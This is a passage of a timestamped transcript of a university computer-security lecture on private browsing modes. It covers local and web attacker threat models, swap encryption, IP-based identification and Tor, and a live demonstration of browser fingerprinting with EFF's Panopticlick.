              <text_slice>because even though the attacker
has post-session access,</text_slice>
            </slice>
            <slice>
              <time_slice>32:38</time_slice>
              <text_slice>that's just post-private
mode access.</text_slice>
            </slice>
            <slice>
              <time_slice>32:41</time_slice>
              <text_slice>So there could
this could still be</text_slice>
            </slice>
            <slice>
              <time_slice>32:43</time_slice>
              <text_slice>a public mode session going on.</text_slice>
            </slice>
            <slice>
              <time_slice>32:45</time_slice>
              <text_slice>And the attacker would have
access to the machine, right?</text_slice>
            </slice>
            <slice>
              <time_slice>32:48</time_slice>
              <text_slice>PROFESSOR: So you're worried
about if a concurrent--</text_slice>
            </slice>
            <slice>
              <time_slice>32:49</time_slice>
              <text_slice>AUDIENCE: So if you
have a public mode tab</text_slice>
            </slice>
            <slice>
              <time_slice>32:50</time_slice>
              <text_slice>and you have a private mode tab.</text_slice>
            </slice>
            <slice>
              <time_slice>32:51</time_slice>
              <text_slice>You close the private tab
and the public mode tab</text_slice>
            </slice>
            <slice>
              <time_slice>32:54</time_slice>
              <text_slice>stays on-- the attacker
could still dump the memory.</text_slice>
            </slice>
            <slice>
              <time_slice>32:58</time_slice>
              <text_slice>And the RAM artifacts
would be problematic.</text_slice>
            </slice>
            <slice>
              <time_slice>33:00</time_slice>
              <text_slice>Is that right?</text_slice>
            </slice>
            <slice>
              <time_slice>33:01</time_slice>
              <text_slice>PROFESSOR: Yeah,
interesting-- so we</text_slice>
            </slice>
            <slice>
              <time_slice>33:04</time_slice>
              <text_slice>will talk at the end of
lecture about an attack which</text_slice>
            </slice>
            <slice>
              <time_slice>33:07</time_slice>
              <text_slice>is somewhat similar.</text_slice>
            </slice>
            <slice>
              <time_slice>33:08</time_slice>
              <text_slice>So most of the threat
models of private browsing</text_slice>
            </slice>
            <slice>
              <time_slice>33:11</time_slice>
              <text_slice>due not assume a
current attacker at all.</text_slice>
            </slice>
            <slice>
              <time_slice>33:12</time_slice>
              <text_slice>In other words, they
assume that when</text_slice>
            </slice>
            <slice>
              <time_slice>33:14</time_slice>
              <text_slice>you're doing private
browsing, there</text_slice>
            </slice>
            <slice>
              <time_slice>33:16</time_slice>
              <text_slice>is no other person
who have a public mode</text_slice>
            </slice>
            <slice>
              <time_slice>33:18</time_slice>
              <text_slice>tab open or anything like that.</text_slice>
            </slice>
            <slice>
              <time_slice>33:20</time_slice>
              <text_slice>But you are in fact correct that
the way that private browsing</text_slice>
            </slice>
            <slice>
              <time_slice>33:24</time_slice>
              <text_slice>modes are often
implemented-- let's</text_slice>
            </slice>
            <slice>
              <time_slice>33:26</time_slice>
              <text_slice>say you open up a
private browsing</text_slice>
            </slice>
            <slice>
              <time_slice>33:27</time_slice>
              <text_slice>tab, you close that tab.</text_slice>
            </slice>
            <slice>
              <time_slice>33:29</time_slice>
              <text_slice>You immediately run to
go get a cup of coffee.</text_slice>
            </slice>
            <slice>
              <time_slice>33:31</time_slice>
              <text_slice>So one attack I will describe
is that Firefox, for example,</text_slice>
            </slice>
            <slice>
              <time_slice>33:34</time_slice>
              <text_slice>still keeps statistics about,
let's say, memory allocation.</text_slice>
            </slice>
            <slice>
              <time_slice>33:37</time_slice>
              <text_slice>So if the memory
for your private tab</text_slice>
            </slice>
            <slice>
              <time_slice>33:39</time_slice>
              <text_slice>is actually laid
with the garbage</text_slice>
            </slice>
            <slice>
              <time_slice>33:40</time_slice>
              <text_slice>collected and I can basically
go to about.memory or whatever</text_slice>
            </slice>
            <slice>
              <time_slice>33:43</time_slice>
              <text_slice>and actually see URLs
and stuff in your tab.</text_slice>
            </slice>
            <slice>
              <time_slice>33:46</time_slice>
              <text_slice>But yeah, but the long story
short, most of these attacker</text_slice>
            </slice>
            <slice>
              <time_slice>33:49</time_slice>
              <text_slice>models do not assume
a concurrent attacker</text_slice>
            </slice>
            <slice>
              <time_slice>33:51</time_slice>
              <text_slice>at the same time that
you're privately browsing.</text_slice>
            </slice>
            <slice>
              <time_slice>33:55</time_slice>
              <text_slice>Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>34:00</time_slice>
              <text_slice>So this is one that you
do-- do swap encryption</text_slice>
            </slice>
            <slice>
              <time_slice>34:03</time_slice>
              <text_slice>like I mentioned.</text_slice>
            </slice>
            <slice>
              <time_slice>34:04</time_slice>
              <text_slice>This is nice because this gives
you some pretty cool security</text_slice>
            </slice>
            <slice>
              <time_slice>34:06</time_slice>
              <text_slice>properties without
having to change</text_slice>
            </slice>
            <slice>
              <time_slice>34:08</time_slice>
              <text_slice>the browser at all or
any of applications</text_slice>
            </slice>
            <slice>
              <time_slice>34:10</time_slice>
              <text_slice>running on top of this.</text_slice>
            </slice>
            <slice>
              <time_slice>34:11</time_slice>
              <text_slice>And in practice, the CPU cost
of doing this kind of thing</text_slice>
            </slice>
            <slice>
              <time_slice>34:15</time_slice>
              <text_slice>is much, much lower
than the actual cost</text_slice>
            </slice>
            <slice>
              <time_slice>34:17</time_slice>
              <text_slice>of doing I/O in
general, particularly</text_slice>
            </slice>
            <slice>
              <time_slice>34:19</time_slice>
              <text_slice>if you have a disk
because with disk you're</text_slice>
            </slice>
            <slice>
              <time_slice>34:21</time_slice>
              <text_slice>particularly paying C cost.</text_slice>
            </slice>
            <slice>
              <time_slice>34:22</time_slice>
              <text_slice>That's a mechanical cost.</text_slice>
            </slice>
            <slice>
              <time_slice>34:24</time_slice>
              <text_slice>This is all processing cost--
pure computational stuff.</text_slice>
            </slice>
            <slice>
              <time_slice>34:27</time_slice>
              <text_slice>So typically this not that
big of a performance hit.</text_slice>
            </slice>
            <slice>
              <time_slice>34:36</time_slice>
              <text_slice>Oh, god there's physics here.</text_slice>
            </slice>
            <slice>
              <time_slice>34:41</time_slice>
              <text_slice>This is always an adventure.</text_slice>
            </slice>
            <slice>
              <time_slice>34:45</time_slice>
              <text_slice>So the next attacker that
we're going to look at</text_slice>
            </slice>
            <slice>
              <time_slice>34:52</time_slice>
              <text_slice>is this web attacker
that I mentioned</text_slice>
            </slice>
            <slice>
              <time_slice>34:57</time_slice>
              <text_slice>at the beginning of lecture.</text_slice>
            </slice>
            <slice>
              <time_slice>35:00</time_slice>
              <text_slice>So the assumption here
are that the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>35:08</time_slice>
              <text_slice>who controls the website
that the user is going</text_slice>
            </slice>
            <slice>
              <time_slice>35:17</time_slice>
              <text_slice>to visit in private
browsing mode--</text_slice>
            </slice>
            <slice>
              <time_slice>35:22</time_slice>
              <text_slice>how the attacker does
not control the user's</text_slice>
            </slice>
            <slice>
              <time_slice>35:27</time_slice>
              <text_slice>local machine.</text_slice>
            </slice>
            <slice>
              <time_slice>35:32</time_slice>
              <text_slice>And so the security
goals that we</text_slice>
            </slice>
            <slice>
              <time_slice>35:34</time_slice>
              <text_slice>want to have against the
web attackers are two fold.</text_slice>
            </slice>
            <slice>
              <time_slice>35:41</time_slice>
              <text_slice>So first, we don't
want the attacker</text_slice>
            </slice>
            <slice>
              <time_slice>35:46</time_slice>
              <text_slice>to be able to
identify the users.</text_slice>
            </slice>
            <slice>
              <time_slice>35:55</time_slice>
              <text_slice>And by identify
with, we just mean</text_slice>
            </slice>
            <slice>
              <time_slice>35:57</time_slice>
              <text_slice>we don't want the attacker
to be able to distinguish</text_slice>
            </slice>
            <slice>
              <time_slice>35:59</time_slice>
              <text_slice>the user from any
other user that happens</text_slice>
            </slice>
            <slice>
              <time_slice>36:02</time_slice>
              <text_slice>to be visiting the site.</text_slice>
            </slice>
            <slice>
              <time_slice>36:04</time_slice>
              <text_slice>And you also might
imagine that perhaps we</text_slice>
            </slice>
            <slice>
              <time_slice>36:08</time_slice>
              <text_slice>don't want the attacker to
tell whether or not we're</text_slice>
            </slice>
            <slice>
              <time_slice>36:15</time_slice>
              <text_slice>using private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>36:18</time_slice>
              <text_slice>So the attacker can't
tell the user employees</text_slice>
            </slice>
            <slice>
              <time_slice>36:24</time_slice>
              <text_slice>private browsing.</text_slice>
            </slice>
            <slice>
              <time_slice>36:28</time_slice>
              <text_slice>And so as the paper
discusses, defending</text_slice>
            </slice>
            <slice>
              <time_slice>36:33</time_slice>
              <text_slice>against the web attacker
is actually pretty tricky.</text_slice>
            </slice>
            <slice>
              <time_slice>36:37</time_slice>
              <text_slice>So what does it
mean, for example,</text_slice>
            </slice>
            <slice>
              <time_slice>36:39</time_slice>
              <text_slice>to identify different users.</text_slice>
            </slice>
            <slice>
              <time_slice>36:41</time_slice>
              <text_slice>Like I said, at a high
level, as you could imagine,</text_slice>
            </slice>
            <slice>
              <time_slice>36:44</time_slice>
              <text_slice>the user looks no different
than any other users</text_slice>
            </slice>
            <slice>
              <time_slice>36:47</time_slice>
              <text_slice>that visits this site.</text_slice>
            </slice>
            <slice>
              <time_slice>36:48</time_slice>
              <text_slice>So you can imagine
a web attacker</text_slice>
            </slice>
            <slice>
              <time_slice>36:50</time_slice>
              <text_slice>might want to do one
of two specific things.</text_slice>
            </slice>
            <slice>
              <time_slice>36:53</time_slice>
              <text_slice>It might want to say, OK,
I see multiple people who</text_slice>
            </slice>
            <slice>
              <time_slice>36:56</time_slice>
              <text_slice>were visiting my site in
private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>36:59</time_slice>
              <text_slice>You were visitor five,
seven, and eight.</text_slice>
            </slice>
            <slice>
              <time_slice>37:02</time_slice>
              <text_slice>So in other words,
identifying a particular user</text_slice>
            </slice>
            <slice>
              <time_slice>37:04</time_slice>
              <text_slice>within the context of multiple
private browsing sessions.</text_slice>
            </slice>
            <slice>
              <time_slice>37:07</time_slice>
              <text_slice>The second the attacker
might want to do</text_slice>
            </slice>
            <slice>
              <time_slice>37:09</time_slice>
              <text_slice>is actually try to link a user
across public and private mode</text_slice>
            </slice>
            <slice>
              <time_slice>37:14</time_slice>
              <text_slice>browsing sessions.</text_slice>
            </slice>
            <slice>
              <time_slice>37:15</time_slice>
              <text_slice>So I go to Amazon.com once
in public browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>37:18</time_slice>
              <text_slice>I then go to it again in
private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>37:20</time_slice>
              <text_slice>Can the attacker
actually figure out</text_slice>
            </slice>
            <slice>
              <time_slice>37:22</time_slice>
              <text_slice>that I'm actually
the same person</text_slice>
            </slice>
            <slice>
              <time_slice>37:23</time_slice>
              <text_slice>through those two visits.</text_slice>
            </slice>
            <slice>
              <time_slice>37:24</time_slice>
              <text_slice>Yes?</text_slice>
            </slice>
            <slice>
              <time_slice>37:25</time_slice>
              <text_slice>AUDIENCE: This is all a
module of the IP address.</text_slice>
            </slice>
            <slice>
              <time_slice>37:27</time_slice>
              <text_slice>PROFESSOR: Ah, yes,
that's exactly right.</text_slice>
            </slice>
            <slice>
              <time_slice>37:31</time_slice>
              <text_slice>That is excellent foreshadowing.</text_slice>
            </slice>
            <slice>
              <time_slice>37:32</time_slice>
              <text_slice>So right now I'm assuming that
either user employs Tor or uses</text_slice>
            </slice>
            <slice>
              <time_slice>37:38</time_slice>
              <text_slice>something like this.</text_slice>
            </slice>
            <slice>
              <time_slice>37:39</time_slice>
              <text_slice>So yeah, we're punting
on this whole issue of IP</text_slice>
            </slice>
            <slice>
              <time_slice>37:41</time_slice>
              <text_slice>admittedly for now.</text_slice>
            </slice>
            <slice>
              <time_slice>37:42</time_slice>
              <text_slice>That's right.</text_slice>
            </slice>
            <slice>
              <time_slice>37:44</time_slice>
              <text_slice>So yeah, this segues very well.</text_slice>
            </slice>
            <slice>
              <time_slice>37:47</time_slice>
              <text_slice>So what's an easy way
to identify the user,</text_slice>
            </slice>
            <slice>
              <time_slice>37:48</time_slice>
              <text_slice>as you suggested,
the IP address.</text_slice>
            </slice>
            <slice>
              <time_slice>37:50</time_slice>
              <text_slice>So it's a pretty high
likelihood if you</text_slice>
            </slice>
            <slice>
              <time_slice>37:53</time_slice>
              <text_slice>see two visits that are
sort of close in time</text_slice>
            </slice>
            <slice>
              <time_slice>37:55</time_slice>
              <text_slice>relatively speaking
with the same IP</text_slice>
            </slice>
            <slice>
              <time_slice>37:57</time_slice>
              <text_slice>with high likelihood that's
probably the same user.</text_slice>
            </slice>
            <slice>
              <time_slice>38:00</time_slice>
              <text_slice>And this in fact
the motivation-- one</text_slice>
            </slice>
            <slice>
              <time_slice>38:02</time_slice>
              <text_slice>of the motivations
for stuff like Tor.</text_slice>
            </slice>
            <slice>
              <time_slice>38:05</time_slice>
              <text_slice>And so we're actually willing
to discuss Tor next lecture.</text_slice>
            </slice>
            <slice>
              <time_slice>38:08</time_slice>
              <text_slice>So in case you
haven't heard of Tor,</text_slice>
            </slice>
            <slice>
              <time_slice>38:10</time_slice>
              <text_slice>it's basically a tool which
tries to obscure things</text_slice>
            </slice>
            <slice>
              <time_slice>38:13</time_slice>
              <text_slice>like your IP address.</text_slice>
            </slice>
            <slice>
              <time_slice>38:15</time_slice>
              <text_slice>And you could actually
imagine layering Tor--</text_slice>
            </slice>
            <slice>
              <time_slice>38:18</time_slice>
              <text_slice>having Tor be the foundation.</text_slice>
            </slice>
            <slice>
              <time_slice>38:22</time_slice>
              <text_slice>And then you put private
browsing modes atop that.</text_slice>
            </slice>
            <slice>
              <time_slice>38:24</time_slice>
              <text_slice>And that might give you some
stronger properties then</text_slice>
            </slice>
            <slice>
              <time_slice>38:26</time_slice>
              <text_slice>you would if you used private
browsing modes at all.</text_slice>
            </slice>
            <slice>
              <time_slice>38:31</time_slice>
              <text_slice>But, anyway, so the thing
to mention about Tor</text_slice>
            </slice>
            <slice>
              <time_slice>38:34</time_slice>
              <text_slice>though is that Tor does provide
some sense of IP anonymity.</text_slice>
            </slice>
            <slice>
              <time_slice>38:37</time_slice>
              <text_slice>But it doesn't actually address
things like the data secrecy</text_slice>
            </slice>
            <slice>
              <time_slice>38:40</time_slice>
              <text_slice>lifetime issues or
things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>38:42</time_slice>
              <text_slice>So Tor-- perhaps you can think
of it as maybe necessary,</text_slice>
            </slice>
            <slice>
              <time_slice>38:46</time_slice>
              <text_slice>but insufficient for
a full implementation</text_slice>
            </slice>
            <slice>
              <time_slice>38:48</time_slice>
              <text_slice>of private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>38:50</time_slice>
              <text_slice>And so what's interesting
too is that even if a user</text_slice>
            </slice>
            <slice>
              <time_slice>38:53</time_slice>
              <text_slice>employees Tor, there are still
ways that a web server can</text_slice>
            </slice>
            <slice>
              <time_slice>38:57</time_slice>
              <text_slice>identify the user by looking
at the unique characteristics</text_slice>
            </slice>
            <slice>
              <time_slice>39:02</time_slice>
              <text_slice>of that user's browser.</text_slice>
            </slice>
            <slice>
              <time_slice>39:06</time_slice>
              <text_slice>So this is our final
demo for today.</text_slice>
            </slice>
            <slice>
              <time_slice>39:09</time_slice>
              <text_slice>So let's see here.</text_slice>
            </slice>
            <slice>
              <time_slice>39:12</time_slice>
              <text_slice>So going to get rid of this guy.</text_slice>
            </slice>
            <slice>
              <time_slice>39:15</time_slice>
              <text_slice>And then let's see.</text_slice>
            </slice>
            <slice>
              <time_slice>39:18</time_slice>
              <text_slice>I am going to go to this
site called Panopticlick.</text_slice>
            </slice>
            <slice>
              <time_slice>39:22</time_slice>
              <text_slice>Some of so you heard of this.</text_slice>
            </slice>
            <slice>
              <time_slice>39:23</time_slice>
              <text_slice>It's run the EFF.</text_slice>
            </slice>
            <slice>
              <time_slice>39:25</time_slice>
              <text_slice>The basic idea is it is going
to try to identify you the user</text_slice>
            </slice>
            <slice>
              <time_slice>39:29</time_slice>
              <text_slice>by looking at various
characteristics of your web</text_slice>
            </slice>
            <slice>
              <time_slice>39:32</time_slice>
              <text_slice>browser.</text_slice>
            </slice>
            <slice>
              <time_slice>39:33</time_slice>
              <text_slice>So I'll show you
exactly what I mean.</text_slice>
            </slice>
            <slice>
              <time_slice>39:37</time_slice>
              <text_slice>So I want to go--
the URL is very long.</text_slice>
            </slice>
            <slice>
              <time_slice>39:39</time_slice>
              <text_slice>This is very stressful
for me to type in.</text_slice>
            </slice>
            <slice>
              <time_slice>39:41</time_slice>
              <text_slice>So please don't just if
it doesn't go through.</text_slice>
            </slice>
            <slice>
              <time_slice>39:43</time_slice>
              <text_slice>Let's see.</text_slice>
            </slice>
            <slice>
              <time_slice>39:45</time_slice>
              <text_slice>Panopticlick-- did it work?</text_slice>
            </slice>
            <slice>
              <time_slice>39:49</time_slice>
              <text_slice>Yes, OK.</text_slice>
            </slice>
            <slice>
              <time_slice>39:51</time_slice>
              <text_slice>So I am going to
go to this website.</text_slice>
            </slice>
            <slice>
              <time_slice>39:54</time_slice>
              <text_slice>And it's run by
the folks at EFF.</text_slice>
            </slice>
            <slice>
              <time_slice>39:57</time_slice>
              <text_slice>And I say, OK, test me.</text_slice>
            </slice>
            <slice>
              <time_slice>39:59</time_slice>
              <text_slice>So what this is doing
is it's basically</text_slice>
            </slice>
            <slice>
              <time_slice>40:02</time_slice>
              <text_slice>running a bunch of
JavaScript code, maybe</text_slice>
            </slice>
            <slice>
              <time_slice>40:03</time_slice>
              <text_slice>an applet-- maybe some Java.</text_slice>
            </slice>
            <slice>
              <time_slice>40:05</time_slice>
              <text_slice>And it's trying to
fingerprint my browser.</text_slice>
            </slice>
            <slice>
              <time_slice>40:08</time_slice>
              <text_slice>And it's trying to figure out
how much unique information</text_slice>
            </slice>
            <slice>
              <time_slice>40:12</time_slice>
              <text_slice>does it have.</text_slice>
            </slice>
            <slice>
              <time_slice>40:12</time_slice>
              <text_slice>And so-- let me
increase the font here.</text_slice>
            </slice>
            <slice>
              <time_slice>40:18</time_slice>
              <text_slice>So, for example, one
thing it looks at</text_slice>
            </slice>
            <slice>
              <time_slice>40:20</time_slice>
              <text_slice>is it looks at you
see here what are</text_slice>
            </slice>
            <slice>
              <time_slice>40:23</time_slice>
              <text_slice>all the details of the browser
plugins that I'm running.</text_slice>
            </slice>
            <slice>
              <time_slice>40:27</time_slice>
              <text_slice>So basically it'll run
code in it's web page</text_slice>
            </slice>
            <slice>
              <time_slice>40:29</time_slice>
              <text_slice>that looks and sees do
I have Flash installed?</text_slice>
            </slice>
            <slice>
              <time_slice>40:31</time_slice>
              <text_slice>What version of Flash?</text_slice>
            </slice>
            <slice>
              <time_slice>40:32</time_slice>
              <text_slice>Do I have Java installed?</text_slice>
            </slice>
            <slice>
              <time_slice>40:33</time_slice>
              <text_slice>What version of Java?</text_slice>
            </slice>
            <slice>
              <time_slice>40:35</time_slice>
              <text_slice>So you can see that these
are all-- they can't even</text_slice>
            </slice>
            <slice>
              <time_slice>40:39</time_slice>
              <text_slice>fit on the tree at one time.</text_slice>
            </slice>
            <slice>
              <time_slice>40:40</time_slice>
              <text_slice>These are like all the various
plugins and ridiculous formats</text_slice>
            </slice>
            <slice>
              <time_slice>40:44</time_slice>
              <text_slice>that my browser supports.</text_slice>
            </slice>
            <slice>
              <time_slice>40:45</time_slice>
              <text_slice>Now, the high level-- this
should be troubling to you</text_slice>
            </slice>
            <slice>
              <time_slice>40:48</time_slice>
              <text_slice>if you're a security person.</text_slice>
            </slice>
            <slice>
              <time_slice>40:49</time_slice>
              <text_slice>Am I actually actively
using all of these things</text_slice>
            </slice>
            <slice>
              <time_slice>40:51</time_slice>
              <text_slice>at a given time?</text_slice>
            </slice>
            <slice>
              <time_slice>40:53</time_slice>
              <text_slice>This gives me nightmares.</text_slice>
            </slice>
            <slice>
              <time_slice>40:55</time_slice>
              <text_slice>So what ends up
happening is that web</text_slice>
            </slice>
            <slice>
              <time_slice>40:57</time_slice>
              <text_slice>servers-- this web attacker--
they can hunt code like this.</text_slice>
            </slice>
            <slice>
              <time_slice>41:00</time_slice>
              <text_slice>And they can figure out what
are all the plugins that you're</text_slice>
            </slice>
            <slice>
              <time_slice>41:02</time_slice>
              <text_slice>looking at.</text_slice>
            </slice>
            <slice>
              <time_slice>41:03</time_slice>
              <text_slice>Now if you look at these
two columns to the left,</text_slice>
            </slice>
            <slice>
              <time_slice>41:05</time_slice>
              <text_slice>what are they?</text_slice>
            </slice>
            <slice>
              <time_slice>41:07</time_slice>
              <text_slice>So you see up here.</text_slice>
            </slice>
            <slice>
              <time_slice>41:09</time_slice>
              <text_slice>It says bits of
identifying information.</text_slice>
            </slice>
            <slice>
              <time_slice>41:11</time_slice>
              <text_slice>And then one in x
browsers has this value.</text_slice>
            </slice>
            <slice>
              <time_slice>41:15</time_slice>
              <text_slice>So, for example, if
we look at a plugin,</text_slice>
            </slice>
            <slice>
              <time_slice>41:18</time_slice>
              <text_slice>it's saying there is
basically-- it's probably</text_slice>
            </slice>
            <slice>
              <time_slice>41:21</time_slice>
              <text_slice>this is the number
that's more interesting.</text_slice>
            </slice>
            <slice>
              <time_slice>41:23</time_slice>
              <text_slice>It's no longer right.</text_slice>
            </slice>
            <slice>
              <time_slice>41:24</time_slice>
              <text_slice>It's saying that 1 in
approximately 280,000 browsers</text_slice>
            </slice>
            <slice>
              <time_slice>41:30</time_slice>
              <text_slice>has this exact set of plugins.</text_slice>
            </slice>
            <slice>
              <time_slice>41:33</time_slice>
              <text_slice>So that's actually a pretty
specific way to fingerprint me.</text_slice>
            </slice>
            <slice>
              <time_slice>41:37</time_slice>
              <text_slice>It's saying very,
very few people</text_slice>
            </slice>
            <slice>
              <time_slice>41:40</time_slice>
              <text_slice>who have this exact set of
plugins and configurations.</text_slice>
            </slice>
            <slice>
              <time_slice>41:43</time_slice>
              <text_slice>So as it turns
out, they're right.</text_slice>
            </slice>
            <slice>
              <time_slice>41:45</time_slice>
              <text_slice>I am quite unique.</text_slice>
            </slice>
            <slice>
              <time_slice>41:45</time_slice>
              <text_slice>But this a problem from
the security perspective.</text_slice>
            </slice>
            <slice>
              <time_slice>41:50</time_slice>
              <text_slice>So look at this.</text_slice>
            </slice>
            <slice>
              <time_slice>41:50</time_slice>
              <text_slice>The screen size and the
color depths for my machine--</text_slice>
            </slice>
            <slice>
              <time_slice>41:55</time_slice>
              <text_slice>1 in-- what is this?</text_slice>
            </slice>
            <slice>
              <time_slice>41:57</time_slice>
              <text_slice>1.5 million.</text_slice>
            </slice>
            <slice>
              <time_slice>42:00</time_slice>
              <text_slice>That's actually pretty shocking.</text_slice>
            </slice>
            <slice>
              <time_slice>42:02</time_slice>
              <text_slice>So there's only one person in
a sample of 1.5 million people</text_slice>
            </slice>
            <slice>
              <time_slice>42:07</time_slice>
              <text_slice>who have this
particular screen image.</text_slice>
            </slice>
            <slice>
              <time_slice>42:10</time_slice>
              <text_slice>So these things-- they are
additive in some sense.</text_slice>
            </slice>
            <slice>
              <time_slice>42:14</time_slice>
              <text_slice>So the more fingerprints
you have, the more easy</text_slice>
            </slice>
            <slice>
              <time_slice>42:17</time_slice>
              <text_slice>it is for the attacker to
figure out exactly who you are.</text_slice>
            </slice>
            <slice>
              <time_slice>42:21</time_slice>
              <text_slice>And so note this was done
purely from the server side.</text_slice>
            </slice>
            <slice>
              <time_slice>42:24</time_slice>
              <text_slice>I just went to this web page.</text_slice>
            </slice>
            <slice>
              <time_slice>42:26</time_slice>
              <text_slice>And I just did this.</text_slice>
            </slice>
            <slice>
              <time_slice>42:27</time_slice>
              <text_slice>And this is what it got to.</text_slice>
            </slice>
            <slice>
              <time_slice>42:28</time_slice>
              <text_slice>One second-- I want to
show one more thing.</text_slice>
            </slice>
            <slice>
              <time_slice>42:30</time_slice>
              <text_slice>This was done in
private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>42:33</time_slice>
              <text_slice>And let's see here.</text_slice>
            </slice>
            <slice>
              <time_slice>42:38</time_slice>
              <text_slice>I will open up a regular
version of Firefox.</text_slice>
            </slice>
            <slice>
              <time_slice>42:47</time_slice>
              <text_slice>Then I run this up again.</text_slice>
            </slice>
            <slice>
              <time_slice>42:51</time_slice>
              <text_slice>So note that now I'm in
a public mode browser.</text_slice>
            </slice>
            <slice>
              <time_slice>42:55</time_slice>
              <text_slice>Before I was in private mode.</text_slice>
            </slice>
            <slice>
              <time_slice>42:57</time_slice>
              <text_slice>Now I am public mode.</text_slice>
            </slice>
            <slice>
              <time_slice>42:58</time_slice>
              <text_slice>So what you'll see is that when
we look at the browser plugins,</text_slice>
            </slice>
            <slice>
              <time_slice>43:02</time_slice>
              <text_slice>the extent to which I
can be fingerprinted</text_slice>
            </slice>
            <slice>
              <time_slice>43:04</time_slice>
              <text_slice>is essentially the same.</text_slice>
            </slice>
            <slice>
              <time_slice>43:05</time_slice>
              <text_slice>So it's going to be a few
plugins that may or may not</text_slice>
            </slice>
            <slice>
              <time_slice>43:08</time_slice>
              <text_slice>load depending on
the vagaries of how</text_slice>
            </slice>
            <slice>
              <time_slice>43:10</time_slice>
              <text_slice>privacy mode is implemented.</text_slice>
            </slice>
            <slice>
              <time_slice>43:11</time_slice>
              <text_slice>But still, look at that.</text_slice>
            </slice>
            <slice>
              <time_slice>43:13</time_slice>
              <text_slice>I'm still very easy
to fingerprint.</text_slice>
            </slice>
            <slice>
              <time_slice>43:15</time_slice>
              <text_slice>And in fact, if you
look back at this guy</text_slice>
            </slice>
            <slice>
              <time_slice>43:18</time_slice>
              <text_slice>again-- that screen
size and color depth.</text_slice>
            </slice>
            <slice>
              <time_slice>43:20</time_slice>
              <text_slice>I didn't change that
actually between the two--</text_slice>
            </slice>
            <slice>
              <time_slice>43:22</time_slice>
              <text_slice>between public and
private browsing mode.</text_slice>
            </slice>
            <slice>
              <time_slice>43:23</time_slice>
              <text_slice>So that ability to fingerprint
there is basically the same.</text_slice>
            </slice>
            <slice>
              <time_slice>43:26</time_slice>
              <text_slice>This is one reason why it's so
difficult to protect yourself</text_slice>
            </slice>
            <slice>
              <time_slice>43:29</time_slice>
              <text_slice>against this web attack because
browsers themselves reveal</text_slice>
            </slice>
            <slice>
              <time_slice>43:33</time_slice>
              <text_slice>so much information about you
just from their configuration.</text_slice>
            </slice>
            <slice>
              <time_slice>43:35</time_slice>
              <text_slice>AUDIENCE: I am curious the
screen size and color depth</text_slice>
            </slice>
            <slice>
              <time_slice>43:37</time_slice>
              <text_slice>thing.</text_slice>
            </slice>
            <slice>
              <time_slice>43:39</time_slice>
              <text_slice>How does it do that?</text_slice>
            </slice>
            <slice>
              <time_slice>43:39</time_slice>
              <text_slice>How is that unique?</text_slice>
            </slice>
            <slice>
              <time_slice>43:42</time_slice>
              <text_slice>How many screen sizes and
color depths are there?</text_slice>
            </slice>
            <slice>
              <time_slice>43:44</time_slice>
              <text_slice>PROFESSOR: Well, I
think it's actually</text_slice>
            </slice>
            <slice>
              <time_slice>43:46</time_slice>
              <text_slice>hiding some of the
magic that it's using</text_slice>
            </slice>
            <slice>
              <time_slice>43:48</time_slice>
              <text_slice>to figure out what that is.</text_slice>
            </slice>
            <slice>
              <time_slice>43:49</time_slice>
              <text_slice>So at a high level, how do
a lot of these tests work?</text_slice>
            </slice>
            <slice>
              <time_slice>43:51</time_slice>
              <text_slice>So there's some parts of
your browser environment</text_slice>
            </slice>
            <slice>
              <time_slice>43:55</time_slice>
              <text_slice>that are testable purely
by JavaScript code.</text_slice>
            </slice>
            <slice>
              <time_slice>43:57</time_slice>
              <text_slice>So you can imagine that
you can essentially</text_slice>
            </slice>
            <slice>
              <time_slice>43:59</time_slice>
              <text_slice>have JavaScript
code, which looks</text_slice>
            </slice>
            <slice>
              <time_slice>44:01</time_slice>
              <text_slice>over the properties of
the window object, which</text_slice>
            </slice>
            <slice>
              <time_slice>44:03</time_slice>
              <text_slice>is like a global
JavaScript manuscript</text_slice>
            </slice>
            <slice>
              <time_slice>44:05</time_slice>
              <text_slice>and sees how do you
define this weird widget?</text_slice>
            </slice>
            <slice>
              <time_slice>44:07</time_slice>
              <text_slice>How do you define
this weird widget?</text_slice>
            </slice>
            <slice>
              <time_slice>44:09</time_slice>
              <text_slice>And if so, that my count
your plug-ins, lets say.</text_slice>
            </slice>
            <slice>
              <time_slice>44:12</time_slice>
              <text_slice>Pages like this also typically
take advantage of the fact</text_slice>
            </slice>
            <slice>
              <time_slice>44:14</time_slice>
              <text_slice>that Java applets
and Flash objects</text_slice>
            </slice>
            <slice>
              <time_slice>44:18</time_slice>
              <text_slice>can look at all kinds of
more interesting stuff</text_slice>
            </slice>
            <slice>
              <time_slice>44:20</time_slice>
              <text_slice>like the fonts that are
available on your machine</text_slice>
            </slice>
            <slice>
              <time_slice>44:22</time_slice>
              <text_slice>and things like that.</text_slice>
            </slice>
            <slice>
              <time_slice>44:23</time_slice>
              <text_slice>So as to the particular screen
size and color depth thing--</text_slice>
            </slice>
            <slice>
              <time_slice>44:27</time_slice>
              <text_slice>I think-- don't
quote me on that.</text_slice>
            </slice>
            <slice>
              <time_slice>44:28</time_slice>
              <text_slice>But I think what
ends up happening</text_slice>
            </slice>
            <slice>
              <time_slice>44:29</time_slice>
              <text_slice>is it will try to run an applet,
let's say, that will actually</text_slice>
            </slice>
            <slice>
              <time_slice>44:32</time_slice>
              <text_slice>try to query your graphics card
or whatever are the graphics</text_slice>
            </slice>
            <slice>
              <time_slice>44:35</time_slice>
              <text_slice>interfaces in Java and poke
for different aspects of it.</text_slice>
            </slice>
            <slice>
              <time_slice>44:38</time_slice>
              <text_slice>So I think it's actually
more than just screen</text_slice>
            </slice>
            <slice>
              <time_slice>44:40</time_slice>
              <text_slice>size and depth.</text_slice>
            </slice>
            <slice>
              <time_slice>44:41</time_slice>
              <text_slice>They condense it
for size as that.</text_slice>
            </slice>
            <slice>
              <time_slice>44:43</time_slice>
              <text_slice>So at a high level, that's
how all these tricks work.</text_slice>
            </slice>
            <slice>
              <time_slice>44:45</time_slice>
              <text_slice>So you see a bunch
of information--</text_slice>
            </slice>
            <slice>
